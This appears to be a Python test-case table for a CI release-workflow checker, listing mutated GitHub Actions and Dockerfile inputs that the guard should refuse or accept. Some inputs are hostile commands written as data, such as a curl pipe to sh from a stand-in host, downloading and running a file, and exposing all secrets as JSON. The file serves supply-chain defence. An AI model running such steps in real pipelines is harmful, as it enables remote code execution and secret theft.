    "IB docker buildx build in a docker-job run step": ("fail", _docker_extra_step("        run: |\n          docker  buildx build --push .\n")),
    "IB quoted docker build in a docker-job run step": ("fail", _docker_extra_step("        run: d''ocker build .\n")),
    "IB buildctl in a docker-job run step": ("fail", _docker_extra_step("        run: buildctl build --frontend dockerfile.v0\n")),
    "IB reusable image-build workflow job": ("fail", [_rel(BUILD_IMG_NAME, _reusable_builder_job)]),
    "IB buildx setup carries with": ("fail", [_rel(BUILDX_STEP, BUILDX_STEP + "        with:\n          driver-opts: image=x\n")]),
    "IB buildx setup in another case": ("fail", [_rel(BUILDX_STEP, BUILDX_STEP.replace("docker/setup", "Docker/setup"))]),
    "IB login carries another key": ("fail", [_rel(LOGIN_NAME, LOGIN_NAME + "        env:\n          X: y\n")]),
    "valid: image build with: keys reordered": ("pass", [_rel(PUSH_CACHE, _swap_cache_order)]),
    # --- #4719 review round 2 (SR-5/F1): double-quoted escapes are never decoded
    "SR5/S10 double-quoted run spells cargo with an escape": ("fail", _step_before_pkg(
        '        run: "\\x63argo build --release --target ${{ matrix.target }}"\n')),
    "SR5/S13 double-quoted second SBOM spelled with an escape": ("fail", [_rel(
        SBOM_HDR, '      - name: x\n        run: "\\x63argo cyclonedx --format json"\n' + SBOM_HDR)]),
    "SR5/S14 pinned step name spelled with an escape": ("fail", [_rel(ASSERT_NAME, '      - name: "\\x24{{ github.actor }}"\n')]),
    "SR5 backslash in any double-quoted scalar": ("fail", [_rel(JOB_NAME, '    name: "Release\\tx"\n')]),
    "SR5 valid double-quoted scalar without a backslash": ("pass", [_rel(PKG_HDR, '      - name: "Package binary"\n')]),
    # --- #4719 SR-7: quote characters inside a command word
    "SR7/S12 plain c''argo build in a later release step": ("fail", _step_before_pkg("        run: c''argo build --release\n")),
    "SR7 c\"\"argo build in a later release step": ("fail", _step_before_pkg('        run: c""argo build --release\n')),
    "SR7 ca\\rgo build in a later release step": ("fail", _step_before_pkg("        run: ca\\rgo build --release\n")),
    "SR7 c'a'rgo build in a block run": ("fail", _step_before_pkg("        run: |\n          c'a'rgo build --release\n")),
    "SR7 second matrix-target build spelled c''argo in another job": ("fail", [_rel(
        SBOM_HDR, "      - name: x\n        run: c''argo build --target ${{ matrix.target }}\n" + SBOM_HDR)]),
    "SR7 second SBOM spelled c''argo": ("fail", [_rel(
        SBOM_HDR, "      - name: x\n        run: c''argo cyclonedx --format json\n" + SBOM_HDR)]),
    # --- #4719 F3: YAML subset keys
    "F3 space before the colon on runs-on": ("fail", [_rel(NEEDS_REL, NEEDS_REL.replace("runs-on:", "runs-on :"))]),
    "F3 space before the colon on a step key": ("fail", _hdr_key(ASSERT_NAME, "if : false")),
    "F3 space before the colon on the job key": ("fail", [_rel("\n  release:\n", "\n  release :\n")]),
    # --- #4719 F2/F3/F4: Dockerfile parity with BuildKit
    "D11 blank line inside a continuation swallows the binary COPY": ("fail", [_docker(D_BIN, "VOLUME /data \\\n\n" + D_BIN)]),
    "D12 comment line inside the build RUN continuation": ("fail", [_docker(
        '    strip target/release/ai-memory; \\', '    # note\n    strip target/release/ai-memory; \\')]),
    "D12b comment line inside another instruction's continuation": ("fail", [_docker(D_BIN, "LABEL a=1 \\\n# c\n b=2\n" + D_BIN)]),
    "D13 final stage FROM a variable": ("fail", [_docker(D_FINAL, "FROM ${BASE}\n")]),
    "D13b builder stage FROM a variable": ("fail", [_docker(D_BUILDER, "FROM ${BASE} AS builder\n")]),
    "D15 lowercase instruction in the final stage": ("pass", [_docker(D_BIN, D_BIN + "label org.example.x=1\n")]),
    "D15b mixed-case binary COPY is not the binary COPY": ("fail", [_docker(D_BIN, D_BIN.replace("COPY", "Copy"))]),
    "D16 RUN --mount from= in the builder": ("fail", [_docker(D_LOCK, D_LOCK + "RUN --mount=type=bind,from=busybox,target=/m true\n")]),
    "D16b RUN --mount in the final stage": ("fail", [_docker(D_BIN, D_BIN + "RUN --mount=type=bind,from=busybox,target=/m true\n")]),
    "D16c lowercase run --mount": ("fail", [_docker(D_BIN, D_BIN + "run --mount=type=cache,target=/m true\n")]),
    # --- #4719 SR-6/P4/P5/P6: the pg proof is a real, executing, fatal run step
    "P4 the only proof invocation replaced by true": ("fail", [(SHAPE, SHAPE_PROOF_CMD, "true", False)]),
    "P6 continue-on-error on the proof step": ("fail", [(SHAPE, PROOF_NAME, PROOF_NAME + "        continue-on-error: true\n", False)]),
    "P5 if: false on the proof step": ("fail", [(SHAPE, PROOF_NAME, PROOF_NAME + "        if: false\n", False)]),
    "P5b if on the release-shape job": ("fail", [(SHAPE, "    runs-on: ubuntu-latest\n    # Advisory", "    runs-on: ubuntu-latest\n    if: false\n    # Advisory", False)]),
    "P7 proof step deleted": ("fail", [(SHAPE, PROOF_NAME, _drop_proof_step, False)]),
    "P8 proof runs before the build": ("fail", [(SHAPE, PROOF_NAME, _proof_before_build, False)]),
    "P9 proof invocation made non-fatal": ("fail", [(SHAPE, SHAPE_PROOF_CMD, SHAPE_PROOF_CMD + " || true", False)]),
    "P10 proof invocation prefixed with a false test": ("fail", [(SHAPE, SHAPE_PROOF_CMD, "false && " + SHAPE_PROOF_CMD, False)]),
    "P11 proof run block gains a statement": ("fail", [(SHAPE, SHAPE_PROOF_LINE, "          exit 0\n" + SHAPE_PROOF_LINE, False)]),
    "P12 proof step carries env": ("fail", [(SHAPE, PROOF_NAME, PROOF_NAME + "        env:\n          X: y\n", False)]),
    "P13 proof invoked with a different binary": ("fail", [(SHAPE, SHAPE_PROOF_CMD, SHAPE_PROOF_CMD.replace("target/release/ai-memory", "/bin/true"), False)]),
    "P14 proof step name carries an expression": ("fail", [(SHAPE, PROOF_NAME, PROOF_NAME.replace("tier", "tier ${{ github.actor }}"), False)]),
    "P15 proof URL points at another host": ("fail", [(SHAPE, "127.0.0.1:55432/proof", "198.51.100.7:55432/proof", False)]),
    "D16d uppercase RUN --MOUNT": ("fail", [_docker(D_BIN, D_BIN + "RUN --MOUNT=type=cache,target=/m true\n")]),
    "valid: proof URL port changed": ("pass", [(SHAPE, "127.0.0.1:55432/proof", "127.0.0.1:55433/proof", False)]),
    # --- #4719 round 5 SR-8: the docker job is pinned whole; no other job may reach the registry
    "SR8/I01 absolute-path docker push in a docker-job step": ("fail", _docker_extra_step("        run: /usr/bin/docker push x\n")),
    "SR8/I02 docker -H push in a docker-job step": ("fail", _docker_extra_step("        run: docker -H tcp://x:2375 push x\n")),
    "SR8/I05 registry copy tool in a docker-job step": ("fail", _docker_extra_step("        run: crane copy a b\n")),
    "SR8/I09 another push action in the docker job": ("fail", _docker_extra_step("        uses: some/push-action@v1\n")),
    "SR8/I10 local composite action in the docker job": ("fail", _docker_extra_step("        uses: ./.github/actions/x\n")),
    "SR8 extra step after the attestation": ("fail", [_rel(BUILD_IMG_NAME, _docker_step_last)]),
    "SR8/I11 registry copy in the crates-io job": ("fail", [_rel(
        CRATES_STEPS, CRATES_STEPS + "      - name: extra\n        run: echo x ghcr.io/o/ai-memory:latest\n")]),
    "SR8/I11b upper-case registry name in the crates-io job": ("fail", [_rel(
        CRATES_STEPS, CRATES_STEPS + "      - name: extra\n        run: echo x GHCR.IO/o/ai-memory:latest\n")]),
    "SR8 top-level packages write": ("fail", [_rel("\npermissions:\n  contents: write\n",
                                                  "\npermissions:\n  contents: write\n  packages: write\n")]),
    "SR8 crates-io declares permissions": ("fail", [_rel(CRATES_STEPS, CRATES_STEPS.replace(
        "    environment:", "    permissions:\n      packages: write\n    environment:"))]),
    "SR8 release job permissions changed": ("fail", [_rel(REL_PERMS, "      id-token: write\n    strategy:\n")]),
    "SR8 copr job calls a reusable workflow": ("fail", [_rel(COPR_HDR, COPR_HDR + "    uses: ./.github/workflows/x.yml\n")]),
    "SR8 an extra job": ("fail", [_rel(COPR_HDR, _append_job("      - run: echo\n"))]),
    "SR8 unpinned secret": ("fail", _step_before_pkg("        env:\n          T: ${{ secrets.NPM_TOKEN }}\n        run: echo\n")),
    "SR8 secrets dotted with spaces": ("fail", _step_before_pkg("        env:\n          T: ${{ secrets . GITHUB_TOKEN }}\n        run: echo\n")),
    "SR8 all secrets as JSON": ("fail", _step_before_pkg("        env:\n          T: ${{ toJSON(secrets) }}\n        run: echo\n")),
    "SR8 secrets: inherit": ("fail", [_rel(COPR_HDR, COPR_HDR + "    secrets: inherit\n")]),
    "valid: pinned secret in a release step": ("pass", _step_before_pkg(
        "        env:\n          T: ${{ secrets.GITHUB_TOKEN }}\n        run: echo\n")),
    # --- SR-9: docker job keys and values
    "SR9/D01 docker job env": ("fail", [_rel(DOCKER_HDR, DOCKER_HDR + "    env:\n      DOCKER_HOST: tcp://x:2375\n")]),
    "SR9/D03 docker job container": ("fail", [_rel(DOCKER_HDR, DOCKER_HDR + "    container: alpine\n")]),
    "SR9/D04 docker job runs-on self-hosted": ("fail", [_rel(DOCKER_HEAD, DOCKER_HEAD.replace("ubuntu-latest", "self-hosted"))]),
    "SR9 docker job needs changed": ("fail", [_rel(DOCKER_HEAD, DOCKER_HEAD.replace(", supply-chain]", "]"))]),
    "SR9 docker job if changed": ("fail", [_rel(DOCKER_HEAD, DOCKER_HEAD.replace("== 'false'", "== 'true'"))]),
    "SR9 docker job missing": ("fail", [_rel(DOCKER_HDR, _docker_job_scalar)]),
    "SR9 docker steps not a sequence": ("fail", [_rel(DOCKER_HDR, _docker_steps_scalar)]),
    "X05 docker step id quoted": ("fail", [_rel("        id: build\n", "        id: 'build'\n")]),
    "X09 registry login carries another with key": ("fail", [_rel(LOGIN_PW, LOGIN_PW + "          logout: false\n")]),
    "X04 image tags as a folded block": ("fail", [_rel(PUSH_TAGS, "          tags: >\n")]),
    "IB attestation push-to-registry quoted": ("fail", [_rel("push-to-registry: true", "push-to-registry: 'true'")]),
    # --- SR-10: the release-shape skeleton
    "SR10/P20b needs on the release-shape job": ("fail", [_shape(SHAPE_NAME, SHAPE_NAME + "    needs: [x]\n")]),
    "SR10/P21 job defaults": ("fail", [_shape(SHAPE_NAME, SHAPE_NAME + "    defaults:\n      run:\n        working-directory: x\n")]),
    "SR10/P22 job env": ("fail", [_shape(SHAPE_NAME, SHAPE_NAME + "    env:\n      X: y\n")]),
    "SR10/P22b top-level env BASH_ENV": ("fail", [_shape('  CARGO_INCREMENTAL: "0"\n', '  CARGO_INCREMENTAL: "0"\n  BASH_ENV: x\n')]),
    "SR10 top-level env gains a key": ("fail", [_shape('  CARGO_INCREMENTAL: "0"\n', '  CARGO_INCREMENTAL: "0"\n  X: y\n')]),
    "SR10 CARGO_INCREMENTAL unquoted": ("fail", [_shape('  CARGO_INCREMENTAL: "0"\n', "  CARGO_INCREMENTAL: 0\n")]),
    "SR10/P22c top-level defaults": ("fail", [_shape("\nenv:\n", "\ndefaults:\n  run:\n    working-directory: x\n\nenv:\n")]),
    "SR10/P23 job container": ("fail", [_shape(SHAPE_NAME, SHAPE_NAME + "    container: alpine\n")]),
    "SR10 job name changed": ("fail", [_shape(SHAPE_NAME, '    name: "Release shape"\n')]),
    "SR10 job runs-on changed": ("fail", [_shape("    runs-on: ubuntu-latest\n    # Advisory", "    runs-on: self-hosted\n    # Advisory")]),
    "SR10 job timeout changed": ("fail", [_shape("    timeout-minutes: 60\n", "    timeout-minutes: 600\n")]),
    "SR10 an extra job": ("fail", [_shape(SHAPE_NAME, lambda t: t.rstrip("\n") + "\n\n  other:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo\n")]),
    "SR10 permissions changed": ("fail", [_shape("permissions:\n  contents: read\n", "permissions:\n  contents: write\n")]),
    "SR10/P25 last path filter dropped": ("fail", [_shape('      - "migrations/**"\n', "")]),
    "SR10 push branches widened": ("fail", [_shape('branches: ["release/**"]\n', 'branches: ["release/**", "x"]\n')]),
    "SR10 workflow_dispatch given a value": ("fail", [_shape("  workflow_dispatch:\n", "  workflow_dispatch: x\n")]),
    "SR10 run continuation in the proof": ("fail", [_shape(SHAPE_PROOF_CMD, SHAPE_PROOF_CMD.replace(
        " target/release", " \\\n            target/release"))]),
    "X02 proof URL sslmode changed": ("fail", [_shape("55432/proof?sslmode=verify-full", "55432/proof?sslmode=require")]),
    "X03 proof URL sslrootcert changed": ("fail", [_shape("sslrootcert=${PGTLS_DIR}/ca.crt", "sslrootcert=${PGTLS_DIR}/other.crt")]),
    "X19 proof gains a statement after the invocation": ("fail", [_shape(SHAPE_PROOF_CMD, SHAPE_PROOF_CMD + "\n          echo done")]),
    # --- C-1/C-2/SR-11: Dockerfile continuations and spellings
    "C1 canonical build RUN re-indented": ("fail", [_d("    strip target/release/ai-memory; \\", "  strip target/release/ai-memory; \\")]),
    "C1 canonical build RUN joined onto one line": ("fail", [_d("\n".join(DOCKER_RUN_LINES), DOCKER_RUN)]),
    "builder ends with another single-line RUN": ("fail", [_d("\n".join(DOCKER_RUN_LINES), "RUN true")]),
    "C1 continuation in another instruction": ("fail", [_d(D_BIN, D_BIN + "LABEL a=1 \\\n b=2\n")]),
    "SR11/B05 quoted cargo in the final stage": ("fail", [_d(D_BIN, D_BIN + "RUN c''argo --version\n")]),
    "X11 --mount after another flag": ("fail", [_d(D_BIN, D_BIN + "RUN --network=none --mount=type=cache,target=/m true\n")]),
    "X00 FROM image with an embedded $VAR": ("fail", [_d(D_FINAL, "FROM debian:bookworm-slim$SUFFIX\n")]),
}

# SHAPE_ADVISORY states (C-5): (advisory, want, edits).
ADVISORY_CASES: Dict[str, Tuple[bool, str, List[Edit]]] = {
    "advisory: the plain continue-on-error true passes": (True, "pass", []),
    "advisory: continue-on-error removed": (True, "fail", [(SHAPE, "    continue-on-error: true\n", "", False)]),
    "advisory: continue-on-error quoted": (True, "fail", [(SHAPE, "continue-on-error: true", "continue-on-error: 'true'", False)]),
    "advisory: continue-on-error false": (True, "fail", [(SHAPE, "continue-on-error: true", "continue-on-error: false", False)]),
    "required: continue-on-error still set": (False, "fail", []),
    "required: continue-on-error removed passes": (False, "pass", [(SHAPE, "    continue-on-error: true\n", "", False)]),
}
# C-6: (edits, exact error count, substring of the first message).
MESSAGE_CASES: Dict[str, Tuple[List[Edit], int, str]] = {
    "message: LOGIN_USES SHA bump": ([_rel(LOGIN_USES, LOGIN_USES[:-1] + "0")], 1,
                                     "registry login step): `jobs.docker.steps.3.uses` is"),
    "message: LOGIN_USES SHA bump names the constant": ([_rel(LOGIN_USES, LOGIN_USES[:-1] + "0")], 1,
                                                        "update LOGIN_USES in scripts/check_release_features.py"),
    "message: IMAGE_BUILD_USES SHA bump": ([_rel(IMAGE_BUILD_USES, IMAGE_BUILD_USES[:-1] + "0")], 1,
                                           "update IMAGE_BUILD_USES in scripts/check_release_features.py"),
    "message: the on: block of release.yml is pinned": ([(REL, "        default: true\n", "        default: false\n", False)], 1,
                                                       "update ON_PINS in scripts/check_release_features.py"),
    "message: a checkout repin names the constant": ([_rel("", _job_edit("crates-io", _first_checkout_to_other_sha))], 1,
                                                     "differs from CHECKOUT_USES"),
    # Round-3 cells (#8039): the SHAPE_STEPS and uses: pins now refuse the inputs that once reached ONLY the
    # refusals below, so each is proven by an exact message count (a neutralised refusal drops the count).
    "message: an inline use in the release-shape tree step is refused on its own": (
        [(SHAPE, '--features "$FEATURES")"', '--features "$(bash scripts/release-features.sh)")"', False)], 2,
        "inline use of the declaration"),
    "message: a proof before the build is refused on its own": (
        [(SHAPE, PROOF_NAME, _proof_before_build, False)], 5, "the pg proof must run after the release-shaped build"),
    "message: a tag added names DOCKER_STEPS": ([_rel(PUSH_TAGS, PUSH_TAGS + "            ghcr.io/o/ai-memory:x\n")], 1,
                                                "update DOCKER_STEPS in scripts/check_release_features.py"),
    "message: swapped guard and build steps name the unit slot": ([(SHAPE, "", _shape_swap_guard_build, False)], 2,
                                                                  "keys differ from the pinned set"),
    "message: a non-mapping step is refused three times (workflow shape, kind, then the pinned list)": (
        [(SHAPE, "", _shape_scalar_step, False)], 3, "must be a mapping"),
    "message: tag-pinned uses names the job and step": ([(PUBLISH, "", _first_use_to_tag, False)], 1,
                                                        "job `publish-ci-image` step 1"),
    "message: build unit drift names WF_BUILD": ([_rel(REL_BUILD_CMD, REL_BUILD_CMD + " --verbose")], 2,
                                                 "update WF_BUILD in scripts/check_release_features.py"),
}

# Round 5 (#8003): the new job-shape checks refuse these inputs too, so the older, more specific refusals are
# proven by their own message appearing anywhere in the refusal list (a neutralised refusal drops the needle).
JOINED_CASES: Dict[str, Tuple[List[Edit], str]] = {
    # Round 6: the expression allow-list now also refuses `matrix.target` outside the release job, so the text-count
    # backstop is proven by its own message.
    "joined: a second matrix-target build in another job is counted": (
        [_rel(SBOM_HDR, "      - name: x\n        run: cargo build --target ${{ matrix.target }}\n" + SBOM_HDR)],
        "lines run a build tool against the matrix target"),
    "joined: a second matrix-target build spelled c''argo in another job is counted": (
        [_rel(SBOM_HDR, "      - name: x\n        run: c''argo build --target ${{ matrix.target }}\n" + SBOM_HDR)],
        "lines run a build tool against the matrix target"),
    "joined: a second SBOM spelled c''argo is counted": (
        [_rel(SBOM_HDR, "      - name: x\n        run: c''argo cyclonedx --format json\n" + SBOM_HDR)],
        "lines run `cargo ... cyclonedx`"),
    "joined: a c\"\"argo build in a later release step names the canonical build step": (
        _step_before_pkg('        run: c""argo build --release\n'),
        "only the canonical build step may run a build tool in the release job"),
    "joined: a quoted second build is counted against the matrix target": (
        [_rel(REL_BUILD_CMD, REL_BUILD_CMD + "\n" + IND + '"cargo" build --release --target ${{ matrix.target }} --features sal')],
        "lines run a build tool against the matrix target"),
    "joined: a docker job that is not a mapping names the GHCR push": (
        [_rel("", _job_edit("docker", lambda body: "  docker: nope\n"))],
        "the `docker:` job is missing or not a mapping"),
    "joined: docker steps that are not a sequence name DOCKER_STEPS": (
        [_rel("", _job_edit("docker", lambda body: re.sub(r"(?s)    steps:\n.*\Z", "    steps: nope\n", body)))],
        "`jobs.docker.steps` must be a sequence"),
    "joined: a pinned job calling a reusable workflow is named": (
        [_rel(COPR_HDR, COPR_HDR + "    uses: ./.github/workflows/x.yml\n")],
        "calls a reusable workflow"),
}


def _entry_dir(rel: str) -> Callable[[Path], None]:
    def go(root: Path) -> None:
        (root / rel).unlink()
        (root / rel).mkdir()
    return go


def _entry_loop(rel: str) -> Callable[[Path], None]:
    def go(root: Path) -> None:
        (root / rel).unlink()
        os.symlink(root / rel, root / rel)
    return go


def _entry_dangling(rel: str) -> Callable[[Path], None]:
    def go(root: Path) -> None:
        (root / rel).unlink()
        os.symlink(root / "does-not-exist", root / rel)
    return go


def _entry_binary(rel: str) -> Callable[[Path], None]:
    def go(root: Path) -> None:
        (root / rel).write_bytes(b"\xff\xfe not utf-8\n")
    return go


# name -> (setup, wanted exit code) through the real entry point.
ENTRY_CASES: Dict[str, Tuple[Callable[[Path], None], int]] = {
    "entry: non-UTF-8 release.yml exits 2": (_entry_binary(REL), 2),
    "entry: release.yml is a directory exits 2": (_entry_dir(REL), 2),
    "entry: release.yml is a symlink loop exits 2": (_entry_loop(REL), 2),
    "entry: Dockerfile is a directory exits 2": (_entry_dir(DOCKER), 2),
    "entry: Dockerfile is a symlink loop exits 2": (_entry_loop(DOCKER), 2),
    "entry: release-shape.yml is a directory exits 2": (_entry_dir(SHAPE), 2),
    "entry: INSTALL.md is a directory exits 2": (_entry_dir(INSTALL), 2),
    "entry: release-features.sh is a directory exits 2": (_entry_dir(DECL), 2),
    "entry: c8-precheck.yml is a directory exits 2": (_entry_dir(C8), 2),
    "entry: publish-ci-image.yml is a directory exits 2": (_entry_dir(PUBLISH), 2),
    "entry: dangling release.yml symlink is a guard failure (1)": (_entry_dangling(REL), 1),
}


# BuildKit parity (expected outputs recorded from the moby/buildkit v0.23.2 dockerfile parser):
# (physical lines, buildkit mode, logical lines).
PARITY: Tuple[Tuple[Tuple[str, ...], bool, Tuple[str, ...]], ...] = (
    (("FROM a", "VOLUME /data \\", "", "COPY x y"), True, ("FROM a", "VOLUME /data COPY x y")),
    (("RUN echo \\", "# c", "  b"), True, ("RUN echo b",)),
    (("RUN a \\  ", "b"), True, ("RUN a b",)),
    (("RUN echo \\",), True, ("RUN echo",)),
    (("FROM img", "\\"), True, ("FROM img", "")),
    (("FROM img", "  \\  "), True, ("FROM img", "")),
    (("# x", "", "  # y", "RUN  a\tb"), True, ("RUN a b",)),
    (("label x=1",), True, ("label x=1",)),
    (("a \\", "# c", "b"), False, ("a # c", "b")),
    (("a \\", "", "b"), False, ("a", "b")),
    (("RUN ca\\", "rgo"), True, ("RUN cargo",)),
    (("RUN ca\\", "  rgo"), True, ("RUN ca rgo",)),
    (("RUN a\\\\", "b"), True, ("RUN a\\\\", "b")),
    (("ca\\", "rgo"), False, ("cargo",)),
    (("a \\ ", "b"), False, ("a \\", "b")),
    (("a\\\\", "b"), False, ("a\\\\", "b")),
)
# YAML scalar decoding: (document, key, expected text or None when the document is refused).
SCALARS: Tuple[Tuple[str, str, Optional[str]], ...] = (
    ("a: 'it''s'\n", "a", "it's"),
    ("a: ''''\n", "a", "'"),
    ('a: "plain"\n', "a", "plain"),
    ('a: "x\\x63y"\n', "a", None),
    ('a: "x\\"y"\n', "a", None),
    ("a: 'x\\y'\n", "a", "x\\y"),
    ("a: plain\n", "a", "plain"),
)


# Round-5 cells: the workflow-shape, image, `run:` and local-action checks run on small documents (and, for local
# actions, a small tree) so each refusal is proven by an exact message count. name -> (document, files, count,
# needle): ``files`` None = no checked-out tree; a dict = relative path -> text written under the tree root.
R5_DIGEST = "sha256:" + "ab" * 32
R5_LOCAL = "      - uses: ./act\n"
R5_OK_RUN = "      - run: echo ok\n"


def _r5_job(head: str = "", steps: str = "    steps:\n" + R5_OK_RUN) -> str:
    return "jobs:\n  a:\n" + head + steps


def _r5_comp(steps: str) -> str:
    return "name: p\nruns:\n  using: composite\n  steps:\n" + steps


def _r5_act(body: str) -> Dict[str, str]:
    return {"act/action.yml": body}


def _r5_run(cmd: str) -> str:
    return _r5_job(steps="    steps:\n      - run: |\n          " + cmd + "\n")


def _r5_depth() -> Dict[str, str]:
    files = {"act/action.yml": _r5_comp("    - uses: ./act1\n")}
    for n in range(1, 10):
        nxt = "    - uses: ./act%d\n" % (n + 1) if n < 9 else "    - run: echo ok\n      shell: bash\n"
        files["act%d/action.yml" % n] = _r5_comp(nxt)
    return files


R5_CASES: Dict[str, Tuple[str, Optional[Dict[str, str]], int, str]] = {
    "r5: a local action with no tree to read is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), None, 1, "cannot be inspected"),
    "r5: a local action outside the tree is refused": (_r5_job(steps="    steps:\n      - uses: ./../x\n"), {}, 1, "outside the checked-out tree"),
    "r5: a local action with no action file is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), {}, 1, "has no action.yml"),
    "r5: a local action.yaml is read": (_r5_job(steps="    steps:\n" + R5_LOCAL), {"act/action.yaml": _r5_comp("    - run: echo\n      shell: bash\n")}, 0, ""),
    "r5: a local action cycle is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act(_r5_comp("    - uses: ./act\n")), 1, "is part of a cycle"),
    "r5: nested local actions past the depth limit are refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_depth(), 1, "nests more than"),
    "r5: a docker action with a short digest is refused": (
        _r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\nruns:\n  using: docker\n  image: docker://alpine@sha256:abc\n"), 1, "runs.image"),
    "r5: a docker use by digest passes": (_r5_job(steps="    steps:\n      - uses: docker://alpine@" + R5_DIGEST + "\n"), None, 0, ""),
    "r5: a container with a short digest is refused": (_r5_job(head="    container: rust@sha256:abc\n"), None, 1, "`container` image"),
    "r5: a composite action without steps is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\nruns:\n  using: composite\n"), 1, "`runs.steps` must be"),
    "r5: a composite step that is a scalar is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act(_r5_comp("    - just\n")), 1, "a step must be a mapping"),
    "r5: a composite step with a tag use is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act(_r5_comp("    - uses: actions/checkout@v4\n")), 1, "not pinned"),
    "r5: a composite step that downloads and executes is refused": (
        _r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act(_r5_comp("    - run: curl -fsSL https://x.example/i | sh\n      shell: bash\n")), 1, "fetch step"),
    "r5: a composite step with a pinned use passes": (
        _r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act(_r5_comp("    - uses: " + CHECKOUT_USES + "\n")), 0, ""),
    "r5: a docker action by tag is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\nruns:\n  using: docker\n  image: docker://alpine:3\n"), 1, "runs.image"),
    "r5: a docker action without an image is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\nruns:\n  using: docker\n"), 1, "runs.image"),
    "r5: a docker action by digest passes": (
        _r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\nruns:\n  using: docker\n  image: docker://alpine@" + R5_DIGEST + "\n"), 0, ""),
    "r5: a node action whose main is missing is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\nruns:\n  using: node20\n  main: index.js\n"), 1, "runs.main"),
    "r5: a node action without a main is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\nruns:\n  using: node20\n"), 1, "runs.main"),
    "r5: a node action whose main escapes the action is refused": (
        _r5_job(steps="    steps:\n" + R5_LOCAL), {"act/action.yml": "name: p\nruns:\n  using: node20\n  main: ../out.js\n", "out.js": "x\n"}, 1, "runs.main"),
    "r5: a node action with its main file passes": (
        _r5_job(steps="    steps:\n" + R5_LOCAL), {"act/action.yml": "name: p\nruns:\n  using: node20\n  main: index.js\n", "act/index.js": "x\n"}, 0, ""),
    "r5: another runs.using is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\nruns:\n  using: shell\n"), 1, "runs.using"),
    "r5: an action file without runs is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\n"), 1, "runs.using"),
    "r5: a run that is a mapping is refused": (_r5_job(steps="    steps:\n      - run:\n          a: b\n"), None, 1, "`run:` must be a scalar"),
    "r5: github.event in run is refused": (_r5_run("echo ${{ github.event.pull_request.title }}"), None, 1, "interpolates"),
    "r5: github.head_ref in run is refused": (_r5_run("echo ${{ github.head_ref }}"), None, 1, "interpolates"),
    "r5: github.ref_name in run is refused": (_r5_run("echo ${{ github.ref_name }}"), None, 1, "interpolates"),
    "r5: inputs in run is refused": (_r5_run("echo ${{ inputs.tag }}"), None, 1, "interpolates"),
    "r5: a bracketed github event in run is refused": (_r5_run("echo ${{ github['event'].x }}"), None, 1, "interpolates"),
    "r5: github.sha in run is refused": (_r5_run("echo ${{ github.sha }}"), None, 1, "interpolates"),
    "r6: matrix and secrets expressions in run pass": (
        _r5_job(head="    strategy:\n      matrix:\n        os: [ubuntu-latest]\n",
                steps="    steps:\n      - run: echo ${{ matrix.os }} ${{ secrets.TOKEN }}\n"), None, 0, ""),
    "r5: an untrusted expression in env passes": (
        _r5_job(steps="    steps:\n      - env:\n          T: ${{ github.event.pull_request.title }}\n        run: echo \"$T\"\n"), None, 0, ""),
    "r6: a matrix key outside the job matrix is refused": (_r5_run("echo ${{ matrix.zz }}"), None, 1, "interpolates"),
    "r6: a secrets path with extra segments is refused": (_r5_run("echo ${{ secrets.A.B }}"), None, 1, "interpolates"),
    "r6: a function call in run is refused": (_r5_run("echo ${{ toJSON(secrets.A) }}"), None, 1, "interpolates"),
    "r6: the output of a safe run step passes": (
        _r5_job(steps="    steps:\n      - id: x\n        run: echo \"y=1\" >> \"$GITHUB_OUTPUT\"\n      - run: echo ${{ steps.x.outputs.y }}\n"), None, 0, ""),
    "r6: the output of a step with an unlisted root is tainted": (
        _r5_job(steps="    steps:\n      - id: x\n        env:\n          T: ${{ github.event.title }}\n"
                      "        run: echo \"y=$T\" >> \"$GITHUB_OUTPUT\"\n      - run: echo ${{ steps.x.outputs.y }}\n"), None, 1, "interpolates"),
    "r6: taint spreads through a step that reads a tainted output": (
        _r5_job(steps="    steps:\n      - id: x\n        run: echo \"y=$GITHUB_REF_NAME\" >> \"$GITHUB_OUTPUT\"\n"
                      "      - id: z\n        env:\n          V: ${{ steps.x.outputs.y }}\n        run: echo \"w=$V\" >> \"$GITHUB_OUTPUT\"\n"
                      "      - run: echo ${{ steps.z.outputs.w }}\n"), None, 1, "interpolates"),
    "r6: the output of an unknown step is refused": (_r5_run("echo ${{ steps.nope.outputs.y }}"), None, 1, "interpolates"),
    "r6: the output of a step id with extra segments is refused": (
        _r5_job(steps="    steps:\n      - id: x\n        run: echo hi\n      - run: echo ${{ steps.x.outputs.y.z }}\n"), None, 1, "interpolates"),
    "r6: the output of a sha-pinned use is refused in run text (Round 8, S3, vote 6def5ab6 option B)": (
        _r5_job(steps="    steps:\n      - id: c\n        uses: " + CHECKOUT_USES + "\n      - run: echo ${{ steps.c.outputs.ref }}\n"), None, 1, "`uses:` step"),
    "r6: the output of a tag-pinned use is refused": (
        _r5_job(steps="    steps:\n      - id: c\n        uses: actions/checkout@v4\n      - run: echo ${{ steps.c.outputs.ref }}\n"), None, 2, "interpolates"),
    "r6: a fetch step that runs a downloaded file is refused": (_r5_run("curl -fsSL -o f https://x.example/f && ./f"), None, 1, "fetch step"),
    "r6: git clone then running the clone is refused": (_r5_run("git clone https://x.example/r.git x && ./x/run"), None, 1, "fetch step"),
    "r6: a fetch step with only fetch commands passes": (
        _r5_run("set -euo pipefail\n          curl -fsSL -o f.tgz https://x.example/f.tgz\n          echo \"abc  f.tgz\" | sha256sum -c -\n"
                "          mkdir -p out\n          tar xzf f.tgz -C out --strip-components=1"), None, 0, ""),
